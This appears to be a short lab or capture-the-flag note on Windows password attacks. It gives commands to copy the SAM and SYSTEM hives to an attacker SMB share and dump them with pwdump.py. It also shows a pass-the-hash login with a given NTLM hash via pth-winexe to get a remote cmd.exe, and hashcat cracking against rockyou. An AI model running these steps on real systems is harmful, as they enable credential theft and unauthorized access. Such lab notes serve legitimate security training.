1x8 Password - SAM

## Password - SAM

![6837c0af3b0b5707576db2858d4c436a.png](../_resources/d479918f8c70491a9f12087c716d0e6d.png)

```bash
copy C:\Windows\Repair\SAM \\10.9.4.127\kali\
copy C:\Windows\Repair\SYSTEM \\10.9.4.127\kali\

Ref:
https://github.com/Neohapsis/creddump7.git
sudo apt install python-crypto
```
```bash
python2 pwdump.py SYSTEM SAM
```
![f38fe5d35c1acfb486c1fd70feeeafdd.png](../_resources/79a03d0eb15347cfa68b1b78837b0087.png)

**Pass the Hash**

```console
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.206.176 cmd.exe
```
![3d2d7dcaef6dbcd1d359beef9f5c2261.png](../_resources/55c1d73fb8304fc187751967b1354d68.png)

**Crack the Hash**

```bash
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /root/LargeFiles/wordlist/rockyou.txt
```
![0ffe4961f79628366da1a01c0b9bc122.png](../_resources/1817713093144953b2df2f0c81c8afb5.png)

![dd5223c9f787e872ce3094e6fbc41f9d.png](../_resources/5259bd001ce742ddaf6b0f81869a2d7a.png)

